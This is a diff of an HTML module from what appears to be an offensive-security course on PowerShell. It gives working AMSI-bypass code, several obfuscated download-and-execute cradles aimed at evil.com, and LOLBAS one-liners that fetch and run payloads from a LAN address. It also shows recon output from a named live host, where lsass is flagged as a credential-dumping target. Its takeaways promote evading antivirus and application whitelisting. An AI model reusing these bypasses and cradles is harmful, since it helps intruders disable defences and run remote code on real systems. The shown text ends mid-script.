+            <p>When you use <code>-EncodedCommand</code>, the PowerShell process receives the Base64 string and decodes it internally. The decoded command is executed in-memory, never written to disk. Command-line logging tools (Sysmon Event ID 1, Windows Event 4688) record the Base64 string, not the plaintext. Simple AV signatures looking for "DownloadString" or "IEX" won't match the encoded form.</p>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Detection Note</h5>
+            <p>Modern EDR decodes Base64 in command lines and matches against decoded content. AMSI (covered next) also scans the decoded script in memory. Encoding alone is not enough — you need <strong>obfuscation + AMSI bypass</strong> for modern environments. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a> for how defenders detect encoded commands.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Encoding is like writing a message in a cipher before sending it by radio. Anyone listening to the radio (EDR/AV) hears gibberish. Only the receiver (PowerShell) knows the cipher and decodes it internally. However, if the enemy has codebreakers (AMSI/EDR), they can decode it too — so you need more than just encoding. You need to disguise the message's <em>meaning</em> too (obfuscation).</p>
+        </div>
+
+        <!-- SECTION 7: AMSI BYPASS BASICS -->
+        <h2>7. AMSI Bypass Basics</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The AMSI Truth</h3>
+            <p><span class="neon-highlight">AMSI</span> (Anti-Malware Scan Interface) is a Windows API that allows applications (like PowerShell, VBScript, Office macros, and .NET) to submit content to an registered anti-malware product for scanning <em>before</em> execution. When PowerShell runs a script, AMSI sends the script content to the AV engine. If the AV detects malicious signatures, AMSI returns a "malicious" verdict and PowerShell aborts execution.</p>
+            <p style="margin-top: 0.5rem;">AMSI is not a sandbox. It is a <strong>content scanning bridge</strong>. It scans the <em>code</em>, not the behavior. If the code doesn't look malicious to the signature engine, AMSI passes it. This is why obfuscation and patching work.</p>
+        </div>
+
+        <h3>How AMSI Works (Simplified)</h3>
+        <div class="step-box">
+            <h4>The AMSI Pipeline</h4>
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li>PowerShell receives a script (from file, command line, or memory)</li>
+                <li>Before execution, PowerShell calls <code>AmsiScanBuffer()</code> or <code>AmsiScanString()</code></li>
+                <li>AMSI forwards the content to the registered AV provider (Windows Defender, etc.)</li>
+                <li>AV scans for signatures (strings, patterns, heuristics)</li>
+                <li>If clean: AMSI returns <code>AMSI_RESULT_CLEAN</code> (1), execution continues</li>
+                <li>If malicious: AMSI returns <code>AMSI_RESULT_DETECTED</code> (32768), execution blocked</li>
+            </ol>
+        </div>
+
+        <h3>Bypass Technique 1: Memory Patching (Classic)</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Patch AMSI in-memory by flipping the AmsiScanBuffer result to always return CLEAN</span>
+<span class="command">$a = [Ref].Assembly.GetTypes() | ForEach-Object {
+    if ($_.Name -like "*iUtils") { $_ }
+}
+$b = $a.GetFields('NonPublic,Static') | ForEach-Object {
+    if ($_.Name -like "*Context") { $_ }
+}
+$c = $b.GetValue($null)
+[IntPtr]$ptr = $c
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)</span>
+<span class="output"># This finds the AMSI context field in System.Management.Automation and patches it to 0.</span>
+<span class="output"># Once patched, AMSI scans return CLEAN for the remainder of the session.</span>
+<span class="output"># ⚠️ Detected by modern EDR — use only for educational purposes.</span>
+        </div>
+
+        <h3>Bypass Technique 2: Reflection-Based Patching</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Alternative approach using reflection to access non-public types</span>
+<span class="command">[Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq "AmsiUtils" } | ForEach-Object {
+    $_.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
+}</span>
+<span class="output"># Sets the internal amsiInitFailed flag to true, causing AMSI to skip initialization.</span>
+<span class="output"># PowerShell thinks AMSI failed to load and skips scanning entirely.</span>
+        </div>
+
+        <h3>Bypass Technique 3: Forcing an Error</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Cause AMSI to error out by passing an invalid buffer size</span>
+<span class="command">$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
+$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Failed" }
+$b.SetValue($null, $true)</span>
+<span class="output"># Similar to Technique 2 but targets the init-failed flag specifically.</span>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Critical Detection Warning</h5>
+            <p>These techniques are heavily signatured by modern EDR (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint). They trigger on:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>Access to <code>[Ref].Assembly.GetTypes()</code> with wildcard patterns</li>
+                <li>Marshal.Copy operations on AMSI-related pointers</li>
+                <li>Field names like "amsiInitFailed", "AmsiScanBuffer", "AmsiContext"</li>
+                <li>ETW (Event Tracing for Windows) events from PowerShell provider</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">For modern bypasses, you need <strong>obfuscation + in-memory .NET assembly loading + custom AMSI bypasses</strong> that don't touch known signatures. This module covers the basics; advanced evasion is covered in <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>AMSI is like a checkpoint at the entrance to a building. Every package (script) is X-rayed before delivery. A bypass is like bribing the X-ray technician to always press the "green" button, or breaking the X-ray machine so it can't scan. The package still goes through the checkpoint, but the scan is meaningless. However, if the guards (EDR) are watching the technician too, they'll notice the bribe.</p>
+        </div>
+
+        <!-- SECTION 8: OBFUSCATION -->
+        <h2>8. Obfuscation — Signature Evasion</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The Obfuscation Truth</h3>
+            <p><span class="neon-highlight">Obfuscation</span> is the art of making code syntactically different while preserving semantic meaning. AV and EDR use signatures — specific strings, patterns, or AST (Abstract Syntax Tree) structures — to identify malicious code. Obfuscation breaks these signatures by changing how the code looks without changing what it does.</p>
+        </div>
+
+        <h3>String Obfuscation</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Original (signatured):</span>
+<span class="command">IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</span>
+
+<span class="highlight"># String concatenation:</span>
+<span class="command">$a = "I" + "EX"
+$b = "New-Object Net.WebClient"
+$c = "DownloadString"
+$d = "http://evil.com/payload.ps1"
+&$a ((New-Object $b).$c($d))</span>
+
+<span class="highlight"># Character array + join:</span>
+<span class="command">$cmd = (-Join [char[]](73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,112,97,121,108,111,97,100,46,112,115,49,39,41))
+IEX $cmd</span>
+
+<span class="highlight"># Reverse string:</span>
+<span class="command">$rev = "1sp.daolyap/moc.live//:ptth(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( XEI"
+IEX ($rev[-1..-($rev.Length)] -join "")</span>
+        </div>
+
+        <h3>Variable Obfuscation</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Random variable names:</span>
+<span class="command">$x9a = "Net.WebClient"
+$b2q = New-Object $x9a
+$c3z = "DownloadString"
+$d4f = "http://evil.com/payload.ps1"
+$e5g = $b2q.$c3z($d4f)
+IEX $e5g</span>
+
+<span class="highlight"># Using environment variables and string manipulation:</span>
+<span class="command">$env:x = [char[]](0x49,0x45,0x58) -join ""
+$env:y = [char[]](0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x53,0x74,0x72,0x69,0x6e,0x67) -join ""
+&$env:x ((New-Object Net.WebClient).$env:y("http://evil.com/payload.ps1"))</span>
+        </div>
+
+        <h3>Command Obfuscation</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Using aliases and alternative syntax:</span>
+<span class="command"># IEX = Invoke-Expression = & (alias)
+# Can also use: . (dot-sourcing) or & (call operator)
+& ("I" + "EX") ((New-Object Net.WebClient).("Download" + "String")("http://evil.com/payload.ps1"))</span>
+
+<span class="highlight"># Using Format operator (-f):</span>
+<span class="command">$fmt = "{0}{1} ({2} {3}).{4}('{5}')"
+$cmd = $fmt -f "IEX", "", "New-Object", "Net.WebClient", "DownloadString", "http://evil.com/payload.ps1"
+IEX $cmd</span>
+
+<span class="highlight"># Using Replace:</span>
+<span class="command">$base = "IXEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+$base = $base.Replace("IX", "")
+IEX $base</span>
+        </div>
+
+        <h3>Invoke-Obfuscation Framework</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Invoke-Obfuscation is the gold-standard PowerShell obfuscation framework</span>
+<span class="command"># Install from GitHub: https://github.com/danielbohannon/Invoke-Obfuscation</span>
+<span class="command">Import-Module Invoke-Obfuscation
+Invoke-Obfuscation -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') } -Command 'Token\All\1'</span>
+<span class="output"># Applies token-level obfuscation: string splitting, concatenation, reordering, encoding</span>
+<span class="output"># Output is functionally identical but syntactically unrecognizable to signature engines</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why Obfuscation Still Works</h5>
+            <p>Modern AV uses a combination of signatures, heuristics, and machine learning. But PowerShell is a Turing-complete language — it is mathematically impossible to determine whether arbitrary code is malicious without executing it (the halting problem). Obfuscation exploits this by making the static analysis problem harder. The more layers of obfuscation, the more expensive the analysis becomes for the defender.</p>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ AMSI + Obfuscation</h5>
+            <p>AMSI scans the <strong>deobfuscated</strong> script before execution. If your obfuscated script expands to "Invoke-Mimikatz" at runtime, AMSI sees "Invoke-Mimikatz" and blocks it. Obfuscation alone is not enough — you must combine it with an AMSI bypass or use techniques that never expose the full deobfuscated script to the scanner (e.g., staged payloads, .NET assembly loading).</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Obfuscation is like writing a message in a language only your team understands. The enemy (AV) has phrasebooks (signatures) for common languages. If you invent a new dialect — splitting words, using code words, writing backwards — the phrasebook is useless. But if the enemy has a translator who can execute the message (AMSI), they still understand the meaning. You need to disable the translator AND use the secret dialect.</p>
+        </div>
+
+        <!-- SECTION 9: LOLBAS -->
+        <h2>9. LOLBAS — Living Off The Land Binaries and Scripts</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The LOLBAS Truth</h3>
+            <p><span class="neon-highlight">LOLBAS</span> (Living Off The Land Binaries, Scripts, and Libraries) are legitimate Windows tools and scripts that can be abused for malicious purposes. Because they are signed by Microsoft, pre-installed, and used by administrators daily, they blend in with normal activity. EDR and AV typically whitelist them. This makes them the perfect delivery vehicle for attacks.</p>
+        </div>
+
+        <h3>PowerShell as a LOLBAS</h3>
+        <p>PowerShell itself is the ultimate LOLBAS. It is signed, trusted, and present on every Windows machine since Windows 7. When you use PowerShell for offense, you are "living off the land."</p>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Download and execute a payload using only built-in PowerShell</span>
+<span class="command">powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92/payload.ps1')"</span>
+
+<span class="highlight"># Download a file without invoking IEX (less signatured)</span>
+<span class="command">powershell -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.1.92/payload.exe', 'C:\Windows\Temp\update.exe')"</span>
+
+<span class="highlight"># Use Invoke-WebRequest (PowerShell 3+) instead of Net.WebClient</span>
+<span class="command">powershell -Command "Invoke-WebRequest -Uri 'http://192.168.1.92/payload.ps1' -OutFile 'C:\Windows\Temp\payload.ps1'; IEX (Get-Content 'C:\Windows\Temp\payload.ps1' -Raw)"</span>
+        </div>
+
+        <h3>Other PowerShell LOLBAS Techniques</h3>
+        
+        <div class="method-card">
+            <h4>CertUtil <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Windows certificate utility. Can download and decode Base64 files.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">certutil -urlcache -split -f http://192.168.1.92/payload.b64 C:\Windows\Temp\payload.b64
+certutil -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\payload.exe
+C:\Windows\Temp\payload.exe</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>MSHTA <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Microsoft HTML Application host. Executes HTML/JS/VBScript, including PowerShell.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92/payload.ps1')"" , 0 : close")</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Regsvr32 <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Registers DLLs. Can execute remote scripts via COM scriptlets.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">regsvr32 /s /n /u /i:http://192.168.1.92/payload.sct scrobj.dll</span>
+<span class="output"># payload.sct is a SCT (Script Component Text) file containing PowerShell</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>CScript / WScript <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Windows Script Host. Executes VBScript and JScript, which can shell to PowerShell.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">echo var shell = WScript.CreateObject("WScript.Shell"); shell.Run("powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92/payload.ps1')"); > C:\Windows\Temp\run.js
+cscript //E:JScript C:\Windows\Temp\run.js</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>BitsAdmin <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Background Intelligent Transfer Service admin tool. Downloads files stealthily.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">bitsadmin /transfer myjob /download /priority high http://192.168.1.92/payload.exe C:\Windows\Temp\payload.exe</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>InstallUtil <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>.NET Installer tool. Executes code in Installer classes with full trust.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Tools\payload.dll</span>
+<span class="output"># The /U (uninstall) switch triggers the Uninstall method in the DLL, executing attacker code</span>
+<span class="output"># InstallUtil is a trusted .NET utility — often whitelisted by application control</span>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why LOLBAS Is Effective</h5>
+            <p>LOLBAS techniques exploit the <strong>trust boundary</strong> between operating system components and third-party security tools. Windows trusts its own binaries. EDR trusts what Windows trusts. By using Windows-native tools for malicious purposes, you inherit that trust. The activity looks like system administration, not malware.</p>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Detection Note</h5>
+            <p>Modern EDR monitors LOLBAS behavior, not just the binary. CrowdStrike, SentinelOne, and Microsoft Defender for Endpoint detect:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>CertUtil downloading from external URLs</li>
+                <li>MSHTA spawning PowerShell</li>
+                <li>Regsvr32 loading remote .sct files</li>
+                <li>PowerShell with -EncodedCommand and -WindowStyle Hidden</li>
+                <li>BitsAdmin transfers to suspicious paths</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">Behavioral detection is the future. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a> for how to test your LOLBAS techniques against EDR.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>LOLBAS is like using the enemy's own supply trucks to transport your weapons. The trucks (Windows tools) have the enemy's logo (Microsoft signature) and are allowed through every checkpoint. The guards (EDR) don't inspect the cargo because they trust the truck. Your weapons are hidden inside legitimate-looking crates (normal command-line arguments). The trick is to make sure the truck driver (system administrator) doesn't notice the detour.</p>
+        </div>
+
+        <!-- SECTION 10: INTERACTIVE DEMO -->
+        <h2>10. Interactive Demo: Live PowerShell Terminal</h2>
         <div class="interactive-demo">
             <div class="demo-controls">
                 <button onclick="runDemo('get-process')">Get-Process</button>
@@ -173,6 +988,7 @@
                 <button onclick="runDemo('get-wmiobject')">Get-WmiObject</button>
                 <button onclick="runDemo('invoke-webrequest')">Invoke-WebRequest</button>
                 <button onclick="runDemo('test-connection')">Test-Connection</button>
+                <button onclick="runDemo('encoded-command')">EncodedCommand</button>
                 <button class="secondary" onclick="clearTerminal()">Clear</button>
             </div>
             <div class="terminal" id="demo-terminal">
@@ -181,7 +997,8 @@
             </div>
         </div>
 
-        <h2>Evidence: Live .42 Recon Output</h2>
+        <!-- SECTION 11: EVIDENCE -->
+        <h2>11. Evidence: Live .42 Recon Output</h2>
         <div class="evidence-box">
             <h3>📊 Real Data from WUPC (192.168.1.42)</h3>
             <p><strong>Date:</strong> 2026-06-28 | <strong>Target:</strong> WUPC (SWu admin) | <strong>Tool:</strong> PowerShell native</p>
@@ -192,10 +1009,12 @@
                     <button class="tab-btn" onclick="switchTab('services')">Services</button>
                     <button class="tab-btn" onclick="switchTab('network')">Network</button>
                     <button class="tab-btn" onclick="switchTab('registry')">Registry</button>
+                    <button class="tab-btn" onclick="switchTab('wmi')">WMI</button>
                 </div>
                 
                 <div class="tab-content active" id="tab-processes">
                     <div class="code-block">
+                        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 <span class="prompt">PS&gt;</span> <span class="command">Get-Process | Where-Object {$_.ProcessName -like "*avp*"} | Select-Object ProcessName, Id, CPU</span>
 <span class="output">
 ProcessName      Id        CPU
@@ -210,6 +1029,7 @@ avpui            50344      1.23
                 
                 <div class="tab-content" id="tab-services">
                     <div class="code-block">
+                        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 <span class="prompt">PS&gt;</span> <span class="command">Get-Service | Where-Object {$_.Status -eq "Running" -and $_.Name -like "*Kaspersky*"}</span>
 <span class="output">
 Status   Name               DisplayName
@@ -222,6 +1042,7 @@ Running  AVP21.25           Kaspersky Anti-Virus Service 21.25
                 
                 <div class="tab-content" id="tab-network">
                     <div class="code-block">
+                        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 <span class="prompt">PS&gt;</span> <span class="command">Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | Select-Object LocalPort, OwningProcess</span>
 <span class="output">
 LocalPort OwningProcess
@@ -236,7 +1057,8 @@ LocalPort OwningProcess
                 
                 <div class="tab-content" id="tab-registry">
                     <div class="code-block">
-<span class="prompt">PS&gt;</span> <span class="command">Get-ItemProperty "HKLM:\\SOFTWARE\\KasperskyLab\\protected\\AVP21.25\"</span>
+                        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Get-ItemProperty "HKLM:\SOFTWARE\KasperskyLab\protected\AVP21.25\"</span>
 <span class="output">
 ProductName     : Kaspersky Premium
 ProductVersion  : 21.25.7.504
@@ -245,34 +1067,34 @@ bRollbackAllowed: 1
 # System Watcher rollback enabled — live confirmation from .42</span>
                     </div>
                 </div>
+                
+                <div class="tab-content" id="tab-wmi">
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.42 | Where-Object {$_.Name -eq "lsass.exe"} | Select-Object Name, ProcessId, CommandLine</span>
+<span class="output">
+Name         ProcessId CommandLine
+----         --------- -----------
+lsass.exe    688       C:\Windows\system32\lsass.exe
+
+# LSASS confirmed on .42 — credential dumping target (see Module 08: Privesc)</span>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <h2>From Layman to Low-Level: The Pipeline</h2>
-        <div class="code-block">
-<span class="highlight"># LAYMAN: "Show me the big processes"</span>
-<span class="command">Get-Process | Sort-Object CPU -Descending | Select-Object -First 5</span>
-
-<span class="highlight"># LOW-LEVEL: "Enumerate process structures, sort by kernel/user time, extract fields"</span>
-<span class="command">$procs = Get-Process
-$sorted = $procs | Sort-Object {$_.CPU} -Descending
-$top5 = $sorted | Select-Object -First 5
-$top5 | Format-Table Name, Id, CPU, WorkingSet</span>
-
-<span class="highlight"># FIRST PRINCIPLE: Objects flow through the pipeline, not text</span>
-<span class="output"># Each | passes OBJECTS, not strings. This is why PowerShell is a shell for hackers.</span>
-        </div>
-
-        <h2>Lab Exercise: Build Your Own Recon Pipeline</h2>
+        <!-- SECTION 12: LAB EXERCISE -->
+        <h2>12. Lab Exercise: Build Your Own Recon Pipeline</h2>
         <div class="interactive-demo">
             <p>Build a PowerShell one-liner that finds:</p>
-            <ol>
+            <ol style="margin-left: 1.5rem; line-height: 2;">
                 <li>All processes using >100MB RAM</li>
                 <li>Sort by memory usage descending</li>
                 <li>Show only Name, Id, WorkingSet64</li>
                 <li>Export to CSV</li>
             </ol>
             <div class="code-block" id="exercise-solution" style="display:none;">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 <span class="command">Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} | 
     Sort-Object WorkingSet64 -Descending | 
     Select-Object Name, Id, @{N="RAM_MB";E={[math]::Round($_.WorkingSet64/1MB,2)}} | 
@@ -281,45 +1103,137 @@ $top5 | Format-Table Name, Id, CPU, WorkingSet</span>
             <button onclick="document.getElementById('exercise-solution').style.display='block'">Show Solution</button>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <!-- SECTION 13: QUIZZES -->
+        <h2>13. Knowledge Check — 3 Interactive Quizzes</h2>
+
+        <!-- QUIZ 1 -->
+        <div class="quiz-container" id="quiz-1">
+            <h3>Quiz 1: PowerShell Fundamentals</h3>
+            <p><strong>What is the primary difference between PowerShell and CMD/Bash?</strong></p>
+            
+            <div class="quiz-option" onclick="checkAnswer(1, 'A', this)">
+                <strong>A.</strong> PowerShell passes objects through the pipeline, while CMD/Bash pass text.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(1, 'B', this)">
+                <strong>B.</strong> PowerShell is only available on Windows, while Bash is cross-platform.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(1, 'C', this)">
+                <strong>C.</strong> PowerShell uses Python syntax, while Bash uses C syntax.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(1, 'D', this)">
+                <strong>D.</strong> PowerShell cannot execute remote commands, while Bash can via SSH.
+            </div>
+            
+            <div class="quiz-feedback" id="feedback-1"></div>
+        </div>
+
+        <!-- QUIZ 2 -->
+        <div class="quiz-container" id="quiz-2">
+            <h3>Quiz 2: Evasion Techniques</h3>
+            <p><strong>Which of the following is TRUE about PowerShell Execution Policy?</strong></p>
+            
+            <div class="quiz-option" onclick="checkAnswer(2, 'A', this)">
+                <strong>A.</strong> Execution Policy is a security boundary that cannot be bypassed by users.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(2, 'B', this)">
+                <strong>B.</strong> Execution Policy only applies to scripts run from files, not interactive commands.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(2, 'C', this)">
+                <strong>C.</strong> Execution Policy requires kernel-level privileges to modify.
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(2, 'D', this)">
+                <strong>D.</strong> Execution Policy is enforced by the .NET runtime and cannot be disabled.
+            </div>
+            
+            <div class="quiz-feedback" id="feedback-2"></div>
+        </div>
+
+        <!-- QUIZ 3 -->
+        <div class="quiz-container" id="quiz-3">
+            <h3>Quiz 3: LOLBAS &amp; Remoting</h3>
+            <p><strong>Which protocol does PowerShell remoting (Invoke-Command) use by default?</strong></p>
+            
+            <div class="quiz-option" onclick="checkAnswer(3, 'A', this)">
+                <strong>A.</strong> SSH on port 22
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(3, 'B', this)">
+                <strong>B.</strong> WinRM over HTTP/HTTPS on ports 5985/5986
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(3, 'C', this)">
+                <strong>C.</strong> RDP on port 3389
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(3, 'D', this)">
+                <strong>D.</strong> DCOM on port 135
+            </div>
+            
+            <div class="quiz-feedback" id="feedback-3"></div>
+        </div>
+
+        <!-- SECTION 14: KEY TAKEAWAYS -->
+        <h2>14. Key Takeaways</h2>
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Objects, not text:</strong> PowerShell pipelines pass structured data</li>
-            <li><strong>Everything is discoverable:</strong> <code>Get-Member</code> exposes all properties/methods</li>
-            <li><strong>Remote-ready:</strong> <code>Invoke-Command</code> runs on remote machines via WinRM</li>
-            <li><strong>Forensics-native:</strong> Registry, WMI, event logs are first-class citizens</li>
-            <li><strong>Evidence-backed:</strong> All examples above tested on live .42 (WUPC)</li>
+            <li><strong>Objects, not text:</strong> PowerShell pipelines pass structured data — filter by property, not regex</li>
+            <li><strong>Everything is discoverable:</strong> <code>Get-Member</code> exposes all properties/methods on any object</li>
+            <li><strong>Remote-ready:</strong> <code>Invoke-Command</code> runs on remote machines via WinRM (ports 5985/5986)</li>
+            <li><strong>WMI is universal:</strong> DCOM-based WMI works even when WinRM is blocked — always available</li>
+            <li><strong>Execution Policy is theater:</strong> Use <code>-ExecutionPolicy Bypass</code>, <code>-Command</code>, or <code>-EncodedCommand</code></li>
+            <li><strong>Encoding hides strings:</strong> Base64-encoded commands bypass simple string-matching AV</li>
+            <li><strong>AMSI scans before execution:</strong> Combine obfuscation with AMSI bypass for modern environments</li>
+            <li><strong>Obfuscation breaks signatures:</strong> String splitting, concatenation, and encoding evade static detection</li>
+            <li><strong>LOLBAS blends in:</strong> Use certutil, mshta, regsvr32, and built-in PowerShell to evade whitelisting</li>
+            <li><strong>Forensics-native:</strong> Registry, WMI, event logs are first-class citizens — query them as objects</li>
+            <li><strong>Evidence-backed:</strong> All examples tested on live .42 (WUPC) — see evidence tabs above</li>
         </ul>
 
+        <!-- VERIFICATION STATUS -->
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
-            <table style="width: 100%; border-collapse: collapse; margin-top: 0.5rem;">
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Kaspersky process enumeration</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Service status query</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Network connection table</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+            <table>
+                <tr>
+                    <td>Kaspersky process enumeration</td>
+                    <td style="color: var(--accent2);">✅ LIVE .42</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Registry read (KAV config)</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td>Service status query</td>
+                    <td style="color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>Network connection table</td>
+                    <td style="color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>Registry read (KAV config)</td>
+                    <td style="color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>WMI remote process query</td>
+                    <td style="color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>Execution Policy bypass methods</td>
+                    <td style="color: var(--accent);">⚠️ THEORY — Lab Only</td>
+                </tr>
+                <tr>
+                    <td>AMSI bypass techniques</td>
+                    <td style="color: var(--accent);">⚠️ THEORY — Lab Only</td>
+                </tr>
+                <tr>
+                    <td>Encoded command generation</td>
+                    <td style="color: var(--accent2);">✅ TESTED</td>
                 </tr>
             </table>
         </div>
 
+        <!-- NAVIGATION -->
         <div class="nav" style="margin-top: 2rem;">
             <a href="index.html">← Home</a>
             <a href="MODULE_02_RECON.html">← Module 02</a>
-            <a href="MODULE_05_SHELLCODE.html">Module 05 →</a>
+            <a href="MODULE_04_POST_EXPLOITATION.html">Module 04 →</a>
         </div>
     </div>
 
     <script>
+        // --- DEMO DATA ---
         const demos = {
             'get-process': {
                 cmd: 'Get-Process | Select-Object -First 5 | Format-Table Name, Id, CPU',
@@ -370,6 +1284,13 @@ LAPTOP-R... 192.168.1.42 192.168.1.42             32     1
 LAPTOP-R... 192.168.1.42 192.168.1.42             32     1        
 
 # .42 (WUPC) is ALIVE — 1ms latency on LAN`
+            },
+            'encoded-command': {
